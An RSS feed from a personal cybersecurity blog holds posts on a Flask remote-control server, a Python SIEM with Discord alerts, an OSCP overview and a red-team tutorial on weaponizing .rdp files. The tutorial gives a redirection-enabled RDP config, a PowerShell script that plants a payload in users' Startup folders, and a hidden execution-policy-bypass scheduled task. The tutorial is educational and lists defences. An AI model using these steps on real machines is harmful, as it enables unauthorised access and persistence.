<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Cyber Secrets</title>
        <link>https://aibelkingslayer.github.io/posts/</link>
        <description>Recent content in Posts on Cyber Secrets</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 06 Jun 2025 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://aibelkingslayer.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Automate Your Windows Laptop with Flask and Tailscale</title>
            <link>https://aibelkingslayer.github.io/posts/automate-pc-tasks/</link>
            <pubDate>Fri, 06 Jun 2025 00:00:00 +0000</pubDate>
            
            <guid>https://aibelkingslayer.github.io/posts/automate-pc-tasks/</guid>
            <description>&lt;h2 id=&#34;-what-youll-build&#34;&gt;🔐 What You&amp;rsquo;ll Build&lt;/h2&gt;
&lt;p&gt;You&amp;rsquo;ll set up:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A &lt;strong&gt;Flask API server&lt;/strong&gt; on your laptop with authentication&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Endpoints to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;🔒 Lock the screen&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;🔄 Restart or Shutdown&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;📦 Update apps silently via &lt;code&gt;winget&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;🧹 Clear Temp files&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;📺 Open websites like YouTube&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Access the server securely from anywhere using &lt;strong&gt;Tailscale IP&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-requirements&#34;&gt;📦 Requirements&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Windows laptop&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://tailscale.com/&#34;&gt;Tailscale&lt;/a&gt; installed and running&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python 3.x with Flask: &lt;code&gt;pip install flask&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Android app: &lt;a href=&#34;https://play.google.com/store/apps/details?id=ch.rmy.android.http_shortcuts&#34;&gt;HTTP Shortcuts&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-flask-script&#34;&gt;🚀 Flask Script&lt;/h2&gt;
&lt;p&gt;Here&amp;rsquo;s the full code to serve the remote control endpoints:&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="-what-youll-build">🔐 What You&rsquo;ll Build</h2>
<p>You&rsquo;ll set up:</p>
<ul>
<li>
<p>A <strong>Flask API server</strong> on your laptop with authentication</p>
</li>
<li>
<p>Endpoints to:</p>
<ul>
<li>
<p>🔒 Lock the screen</p>
</li>
<li>
<p>🔄 Restart or Shutdown</p>
</li>
<li>
<p>📦 Update apps silently via <code>winget</code></p>
</li>
<li>
<p>🧹 Clear Temp files</p>
</li>
<li>
<p>📺 Open websites like YouTube</p>
</li>
</ul>
</li>
<li>
<p>Access the server securely from anywhere using <strong>Tailscale IP</strong></p>
</li>
</ul>
<h2 id="-requirements">📦 Requirements</h2>
<ul>
<li>
<p>Windows laptop</p>
</li>
<li>
<p><a href="https://tailscale.com/">Tailscale</a> installed and running</p>
</li>
<li>
<p>Python 3.x with Flask: <code>pip install flask</code></p>
</li>
<li>
<p>Android app: <a href="https://play.google.com/store/apps/details?id=ch.rmy.android.http_shortcuts">HTTP Shortcuts</a></p>
</li>
</ul>
<h2 id="-flask-script">🚀 Flask Script</h2>
<p>Here&rsquo;s the full code to serve the remote control endpoints:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> webbrowser
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>AUTH_TOKEN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;REPLACE_WITH_A_SECURE_TOKEN&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_cmd</span>(cmd):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        subprocess<span style="color:#f92672">.</span>Popen(cmd, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Command sent&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> str(e)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_authorized</span>(req):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> req<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;token&#34;</span>) <span style="color:#f92672">==</span> AUTH_TOKEN
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Server Running&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/shutdown&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shutdown</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_authorized(request): <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> run_cmd(<span style="color:#e6db74">&#34;shutdown /s /t 0&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/restart&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">restart</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_authorized(request): <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> run_cmd(<span style="color:#e6db74">&#34;shutdown /r /t 0&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/lock&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lock</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_authorized(request): <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> run_cmd(<span style="color:#e6db74">&#34;rundll32.exe user32.dll,LockWorkStation&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/update&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_authorized(request): <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> run_cmd(<span style="color:#e6db74">&#34;winget upgrade --all --silent&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/clear-temp&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clear_temp</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_authorized(request): <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> run_cmd(<span style="color:#e6db74">&#34;powershell.exe -WindowStyle Hidden -Command Remove-Item -Path $env:TEMP</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">* -Recurse -Force -ErrorAction SilentlyContinue&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/youtube&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">youtube</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_authorized(request): <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        webbrowser<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;https://youtube.com&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;YouTube opened on laptop&#34;</span>, <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Failed to open YouTube: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">500</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
</span></span></code></pre></div><h2 id="-testing-with-http-shortcuts">🧪 Testing with HTTP Shortcuts</h2>
<ol>
<li>
<p>Install the app from the Play Store</p>
</li>
<li>
<p>Create a new shortcut for each action (shutdown, lock, etc.)</p>
</li>
<li>
<p>Use:</p>
<ul>
<li>
<p><strong>URL</strong>: <code>http://&lt;Tailscale-IP&gt;:5000/shutdown</code></p>
</li>
<li>
<p><strong>Method</strong>: <code>POST</code></p>
</li>
<li>
<p><strong>Body type</strong>: Form URL Encoded</p>
</li>
<li>
<p><strong>Key</strong>: <code>token</code>, <strong>Value</strong>: <code>your-auth-token</code></p>
</li>
</ul>
</li>
</ol>
<h2 id="-run-as-background-task">⚙️ Run as Background Task</h2>
<p>Use <strong>Task Scheduler</strong> to run the Flask server silently on boot:</p>
<ol>
<li>
<p>Save your script with <code>.pyw</code> extension (e.g. <code>server.pyw</code>) to prevent a console window from showing.</p>
</li>
<li>
<p>Open Task Scheduler ➝ Create Basic Task.</p>
</li>
<li>
<p>Set trigger to <code>At log on</code>.</p>
</li>
<li>
<p>Action: <strong>Start a program</strong> → Browse to <code>pythonw.exe</code> (in your Python installation directory).</p>
</li>
<li>
<p>Add argument: <code>&quot;C:\Path\To\server.pyw&quot;</code></p>
</li>
<li>
<p>Finish and enable the task.</p>
</li>
</ol>
<p>This approach ensures your Flask server starts automatically and runs in the background invisibly.</p>
<h2 id="-security-tips">🔐 Security Tips</h2>
<ul>
<li>
<p>Keep your <code>AUTH_TOKEN</code> strong and secret</p>
</li>
<li>
<p>Use Tailscale ACLs to limit access</p>
</li>
<li>
<p>Use a firewall rule to allow port 5000 only from specific Tailscale IPs</p>
</li>
</ul>
<h2 id="-final-thoughts">🧠 Final Thoughts</h2>
<p>With this setup, you can safely and easily manage your Windows machine remotely without relying on Alexa or paid automation tools. Whether you&rsquo;re restarting your PC, locking it while away, or just launching Spotify — all it takes is a secure HTTP call.</p>
]]></content>
        </item>
        
        <item>
            <title>Building a Lightweight Python SIEM with Discord Notifications</title>
            <link>https://aibelkingslayer.github.io/posts/siem/</link>
            <pubDate>Sat, 31 May 2025 00:00:00 +0000</pubDate>
            
            <guid>https://aibelkingslayer.github.io/posts/siem/</guid>
            <description>&lt;h2 id=&#34;-what-is-siem&#34;&gt;🧠 What is SIEM?&lt;/h2&gt;
&lt;p&gt;SIEM stands for Security Information and Event Management. It is a system that collects, analyzes, and correlates security event data from various sources — like operating systems, applications, and network devices — in real time.&lt;/p&gt;
&lt;p&gt;A SIEM helps:&lt;/p&gt;
&lt;p&gt;🔍 Detect suspicious activity and threats&lt;/p&gt;
&lt;p&gt;🧾 Maintain audit trails for compliance&lt;/p&gt;
&lt;p&gt;🚨 Alert security teams about incidents&lt;/p&gt;
&lt;p&gt;📊 Visualize security trends across systems&lt;/p&gt;
&lt;p&gt;Traditional enterprise SIEMs (like Splunk, QRadar, or Microsoft Sentinel) are powerful but often complex and expensive.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="-what-is-siem">🧠 What is SIEM?</h2>
<p>SIEM stands for Security Information and Event Management. It is a system that collects, analyzes, and correlates security event data from various sources — like operating systems, applications, and network devices — in real time.</p>
<p>A SIEM helps:</p>
<p>🔍 Detect suspicious activity and threats</p>
<p>🧾 Maintain audit trails for compliance</p>
<p>🚨 Alert security teams about incidents</p>
<p>📊 Visualize security trends across systems</p>
<p>Traditional enterprise SIEMs (like Splunk, QRadar, or Microsoft Sentinel) are powerful but often complex and expensive.</p>
<h2 id="-my-lightweight-python-siem">🐍 My Lightweight Python SIEM</h2>
<p>This project is a lightweight, beginner-friendly SIEM written in Python, focused specifically on Windows event monitoring. It covers high-value events such as:</p>
<p>✅ Successful and failed logins</p>
<p>👤 New user creation</p>
<p>🔑 Password changes/resets</p>
<p>📦 Application installations</p>
<p>🔌 USB device insertions</p>
<p>All critical events are parsed from the Windows Event Logs and pushed to a Discord channel using a webhook, so you can get real-time alerts without setting up a full SIEM stack.</p>
<h3 id="-technical-overview">🛠️ Technical Overview</h3>
<p>The tool leverages Python&rsquo;s capabilities to interact with Windows Event Logs, utilizing modules such as pywin32 for event log access and requests for sending HTTP POST requests to Discord webhooks. By parsing relevant event IDs, the tool identifies specific security-related activities and formats them into readable messages for Discord.</p>
<h3 id="-features">🔍 Features</h3>
<p>The SIEM tool focuses on detecting and alerting the following events:</p>
<ul>
<li>User Account Creation: Identifies when new user accounts are added.</li>
<li>Password Change Attempts: Monitors both successful and failed password change endeavors.</li>
<li>Successful and Failed Logons: Tracks user logon activities to detect unauthorized access attempts.</li>
<li>Password Resets: Alerts when passwords are reset, which could indicate potential security concerns.</li>
<li>Application Installations: Detects when new applications are installed, helping to prevent unauthorized software deployment.</li>
<li>USB Device Insertions: Monitors the insertion of USB devices, a common vector for data exfiltration or malware introduction.</li>
</ul>
<h3 id="-events-monitored">🔧 Events Monitored</h3>
<p>The tool listens to these Windows Event IDs:</p>
<table>
  <thead>
      <tr>
          <th>Event ID</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>4624</td>
          <td>Successful Logon</td>
      </tr>
      <tr>
          <td>4625</td>
          <td>Failed Logon</td>
      </tr>
      <tr>
          <td>4720</td>
          <td>User Account Created</td>
      </tr>
      <tr>
          <td>4723</td>
          <td>Password Change</td>
      </tr>
      <tr>
          <td>4724</td>
          <td>Password Reset</td>
      </tr>
      <tr>
          <td>11707</td>
          <td>Application Installed</td>
      </tr>
      <tr>
          <td>6416</td>
          <td>USB Device Inserted</td>
      </tr>
  </tbody>
</table>
<p>Each of these is tagged with an emoji in the Discord notification to improve readability.</p>
<h3 id="-real-time-notifications-with-discord">🔔 Real-Time Notifications with Discord</h3>
<p>The tool sends alerts using Discord webhooks. Each alert includes:</p>
<ul>
<li>Event type and ID</li>
<li>Time of occurrence</li>
<li>Source of the event</li>
</ul>
<p>Extracted details (e.g., account name, application, USB device)</p>
<h2 id="-getting-started">🚀 Getting Started</h2>
<p>To deploy the SIEM tool:</p>
<ol>
<li>
<p>Set Up Discord Webhook: Create a webhook in your desired Discord channel to receive alerts.</p>
</li>
<li>
<p>Configure the Tool: Input the webhook URL into the tool&rsquo;s configuration.</p>
</li>
<li>
<p>Run the Script: Execute the Python script with Administrative Privileges on the Windows machine.</p>
</li>
<li>
<p>Monitor Alerts: Security events will now be sent to your Discord channel in real-time.</p>
</li>
</ol>
<p>🛠️ Setting Up Windows Logging via Group Policy</p>
<p>To make sure these events are logged by Windows, configure Advanced Audit Policy Settings via Group Policy:</p>
<p>Open <code>gpedit.msc</code></p>
<p>Navigate to:</p>
<p>Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration</p>
<p>Enable the following:</p>
<ul>
<li>Logon/Logoff &gt; Audit Logon Events (Success/Failure)</li>
<li>Account Management &gt; Audit User Account Management (Success)</li>
<li>Object Access &gt; Audit Removable Storage (Success)</li>
<li>System &gt; Audit System Events</li>
<li>Privilege Use &gt; Audit Sensitive Privilege Use</li>
</ul>
<p>Apply and update policies with <code>gpupdate /force</code>.</p>
<h2 id="screenshots">🧾Screenshots</h2>
<ul>
<li>
<p>Running the Script
<img src="Pasted%20image%2020250531055144.png" alt=""></p>
</li>
<li>
<p>Example Command to trigger the event</p>
</li>
</ul>
<pre tabindex="0"><code class="language-cmd-session" data-lang="cmd-session">net user john /add
</code></pre><ul>
<li>Notification
<img src="Pasted%20image%2020250531055319.png" alt=""></li>
</ul>
<p>🔗 <a href="https://github.com/AibelKingslayer/SIEM-Python">https://github.com/AibelKingslayer/SIEM-Python</a></p>
]]></content>
        </item>
        
        <item>
            <title>Weaponizing RDP</title>
            <link>https://aibelkingslayer.github.io/posts/weaponizing-rdp/</link>
            <pubDate>Thu, 29 May 2025 00:00:00 +0000</pubDate>
            
            <guid>https://aibelkingslayer.github.io/posts/weaponizing-rdp/</guid>
            <description>&lt;h1 id=&#34;-weaponizing-rdp-files-for-initial-access--a-red-team-technique&#34;&gt;🖥️ Weaponizing RDP Files for Initial Access – A Red Team Technique&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;Disclaimer: This post is for educational and ethical red teaming purposes only.&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Remote Desktop Protocol (.RDP) files are often considered benign by end users and IT admins alike. But under the right circumstances, they can be weaponized to deliver payloads — an advanced technique often explored in controlled penetration testing environments.&lt;/p&gt;
&lt;p&gt;In this post, we walk through the essentials of RDP file weaponization and automation using Task Scheduler and PowerShell.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h1 id="-weaponizing-rdp-files-for-initial-access--a-red-team-technique">🖥️ Weaponizing RDP Files for Initial Access – A Red Team Technique</h1>
<p><em>Disclaimer: This post is for educational and ethical red teaming purposes only.</em></p>
<hr>
<p>Remote Desktop Protocol (.RDP) files are often considered benign by end users and IT admins alike. But under the right circumstances, they can be weaponized to deliver payloads — an advanced technique often explored in controlled penetration testing environments.</p>
<p>In this post, we walk through the essentials of RDP file weaponization and automation using Task Scheduler and PowerShell.</p>
<hr>
<h2 id="-objective">🎯 Objective</h2>
<ul>
<li><strong>Abuse RDP file trust</strong> to gain initial access</li>
<li><strong>Automate payload execution</strong> when an RDP session is established</li>
<li><strong>Operate stealthily</strong> by using PowerShell and Windows Task Scheduler</li>
</ul>
<hr>
<h2 id="-step-1-crafting-the-rdp-file">🔧 Step 1: Crafting the <code>.rdp</code> File</h2>
<p>An <code>.RDP</code> file can be modified to connect to a specified IP while maintaining a typical user experience. Here&rsquo;s a sample configuration you can build upon:</p>
<pre tabindex="0"><code class="language-rdp" data-lang="rdp">full address:s:192.168.50.132
prompt for credentials:i:0
redirectclipboard:i:1
devicestoredirect:s:*
drivestoredirect:s:*
</code></pre><p>This enables clipboard access and device/drive redirection — which can be abused by attackers for lateral movement or persistence.</p>
<hr>
<h2 id="-step-2-powershell-payload-to-copy-a-binary-to-startup-folder">🧪 Step 2: PowerShell Payload to Copy a Binary to Startup Folder</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$Users = Get-ChildItem -Path <span style="color:#e6db74">&#34;\\tsclient\C\Users&#34;</span> -Directory | Where-Object { $_.Name <span style="color:#f92672">-notlike</span> <span style="color:#e6db74">&#34;Public&#34;</span> <span style="color:#f92672">-and</span> $_.Name <span style="color:#f92672">-notlike</span> <span style="color:#e6db74">&#34;Default*&#34;</span> }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($User <span style="color:#66d9ef">in</span> $Users) {
</span></span><span style="display:flex;"><span>    $StartupPath = <span style="color:#e6db74">&#34;\\tsclient\C\Users\</span>$($User.Name)<span style="color:#e6db74">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&#34;</span>
</span></span><span style="display:flex;"><span>    Copy-Item -Path <span style="color:#e6db74">&#34;C:\Users\admin\Documents\RDP-Exploit\hello.exe&#34;</span> -Destination $StartupPath -ErrorAction SilentlyContinue
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This script looks for user directories and places the payload (<code>hello.exe</code>) into their startup folder — ensuring it executes on their next login.</p>
<hr>
<h2 id="-step-3-automating-with-task-scheduler">⏲️ Step 3: Automating with Task Scheduler</h2>
<p>Set up a scheduled task that triggers upon a remote desktop connection. This allows code execution at the exact moment the target logs in.</p>
<h3 id="general-tab">General Tab</h3>
<ul>
<li>Name the task (e.g., <code>Updater</code>)</li>
<li>Run only when the user is logged in</li>
<li>Run with highest privileges</li>
</ul>
<p><img src="Pasted%20image%2020250120173230.png" alt=""></p>
<hr>
<h3 id="trigger-configuration">Trigger Configuration</h3>
<ul>
<li>Choose <code>On connection to user session</code></li>
<li>Target all users for broader coverage</li>
</ul>
<p><img src="Pasted%20image%2020250120173241.png" alt=""></p>
<hr>
<h3 id="action-configuration">Action Configuration</h3>
<p>Command:</p>
<pre tabindex="0"><code>powershell.exe -WindowStyle Hidden -Ep Bypass -c C:\Users\admin\Downloads\Hacking\RDP-Exploit\run.ps1
</code></pre><p>This ensures silent execution of your PowerShell script on login.</p>
<p><img src="Pasted%20image%2020250120173258.png" alt=""></p>
<hr>
<h2 id="-ethics--defense">⚠️ Ethics &amp; Defense</h2>
<p>This technique should <em>only</em> be practiced in lab environments with proper consent. Defenders can detect this with:</p>
<ul>
<li>PowerShell logging</li>
<li>Monitoring Task Scheduler activity</li>
<li>Inspecting <code>.RDP</code> files for unusual settings</li>
</ul>
<hr>
<h2 id="-final-thoughts">📌 Final Thoughts</h2>
<p>RDP files are often overlooked as attack vectors. Weaponizing them shows how even common administrative tools can be turned into attack surfaces when combined with automation.</p>
]]></content>
        </item>
        
        <item>
            <title>My OSCP Journey</title>
            <link>https://aibelkingslayer.github.io/posts/my-oscp-journey/</link>
            <pubDate>Sat, 28 Dec 2024 00:00:00 +0000</pubDate>
            
            <guid>https://aibelkingslayer.github.io/posts/my-oscp-journey/</guid>
            <description>&lt;h2 id=&#34;what-is-oscp&#34;&gt;What is OSCP&lt;/h2&gt;
&lt;p&gt;The Offensive Security Certified Professional (OSCP) is a highly regarded certification in the field of cybersecurity, offered by Offensive Security. It is designed to test a candidate’s ability to think critically and apply practical penetration testing skills in real-world scenarios. The OSCP certification is especially valued among cybersecurity professionals, as it demonstrates hands-on expertise in ethical hacking and penetration testing.&lt;/p&gt;
&lt;h3 id=&#34;key-highlights-of-oscp&#34;&gt;Key Highlights of OSCP:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Practical Focus:&lt;/strong&gt; Unlike many theoretical certifications, OSCP emphasizes hands-on skills. It’s not just about knowing the concepts; it’s about applying them effectively.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="what-is-oscp">What is OSCP</h2>
<p>The Offensive Security Certified Professional (OSCP) is a highly regarded certification in the field of cybersecurity, offered by Offensive Security. It is designed to test a candidate’s ability to think critically and apply practical penetration testing skills in real-world scenarios. The OSCP certification is especially valued among cybersecurity professionals, as it demonstrates hands-on expertise in ethical hacking and penetration testing.</p>
<h3 id="key-highlights-of-oscp">Key Highlights of OSCP:</h3>
<ol>
<li>
<p><strong>Practical Focus:</strong> Unlike many theoretical certifications, OSCP emphasizes hands-on skills. It’s not just about knowing the concepts; it’s about applying them effectively.</p>
</li>
<li>
<p><strong>Challenging Nature:</strong> The exam is known for its difficulty, pushing candidates to think like an attacker and solve complex problems under time constraints.</p>
</li>
<li>
<p><strong>Recognition:</strong> OSCP is widely recognized and respected by employers, making it a valuable addition to any cybersecurity professional’s resume.</p>
</li>
</ol>
<h3 id="about-the-oscp-exam">About the OSCP Exam:</h3>
<p>The OSCP exam is a rigorous 24-hour challenge designed to assess a candidate’s penetration testing skills. Here’s what you need to know:</p>
<h4 id="1-structure-of-the-exam">1. <strong>Structure of the Exam:</strong></h4>
<ul>
<li>
<p>Candidates are provided with a virtual network of machines to exploit.</p>
</li>
<li>
<p>The goal is to gain administrative (root) access to as many machines as possible within the allotted time.</p>
</li>
<li>
<p>Each machine carries a specific point value, and candidates need to achieve a minimum of 70/100 score to pass.</p>
</li>
</ul>
<h4 id="2-exam-requirements">2. <strong>Exam Requirements:</strong></h4>
<ul>
<li>
<p>Exploitation involves enumeration, vulnerability assessment, and manual exploitation techniques.</p>
</li>
<li>
<p>Candidates must submit a detailed report outlining the steps taken to exploit the machines, including screenshots and technical details.</p>
</li>
</ul>
<h4 id="3-timeframe">3. <strong>Timeframe:</strong></h4>
<ul>
<li>
<p>The exam lasts 24 hours, after which candidates have an additional 24 hours to submit their report.</p>
</li>
<li>
<p>Proper time management is crucial, as candidates need to balance exploitation efforts and documentation.</p>
</li>
</ul>
<h4 id="4-topics-covered">4. <strong>Topics Covered:</strong></h4>
<ul>
<li>
<p><strong>Introduction to Cybersecurity</strong></p>
</li>
<li>
<p><strong>Effective Learning Strategies</strong></p>
</li>
<li>
<p><strong>Information Gathering</strong></p>
</li>
<li>
<p><strong>Vulnerability Scanning</strong></p>
</li>
<li>
<p><strong>Introduction to Web Applications</strong></p>
</li>
<li>
<p><strong>Common Web Application Attacks</strong></p>
</li>
<li>
<p><strong>SQL Injection Attacks</strong></p>
</li>
<li>
<p><strong>Client-Side Attacks</strong></p>
</li>
<li>
<p><strong>Locating Public Exploits</strong></p>
</li>
<li>
<p><strong>Fixing Exploits</strong></p>
</li>
<li>
<p><strong>Antivirus Evasion</strong></p>
</li>
<li>
<p><strong>Password Attacks</strong></p>
</li>
<li>
<p><strong>Windows Privilege Escalation</strong></p>
</li>
<li>
<p><strong>Linux Privilege Escalation</strong></p>
</li>
<li>
<p><strong>Port Redirection and SSH Tunneling</strong></p>
</li>
<li>
<p><strong>Advanced Tunneling</strong></p>
</li>
<li>
<p><strong>The Metasploit Framework</strong></p>
</li>
<li>
<p><strong>Active Directory Introduction and Enumeration</strong></p>
</li>
<li>
<p><strong>Attacking Active Directory Authentication</strong></p>
</li>
<li>
<p><strong>Lateral Movement in Active Directory</strong></p>
</li>
<li>
<p><strong>Report Writing for Penetration Testers</strong></p>
</li>
<li>
<p><strong>Assembling the Pieces</strong></p>
</li>
<li>
<p><strong>Trying Harder: The Labs</strong></p>
</li>
</ul>
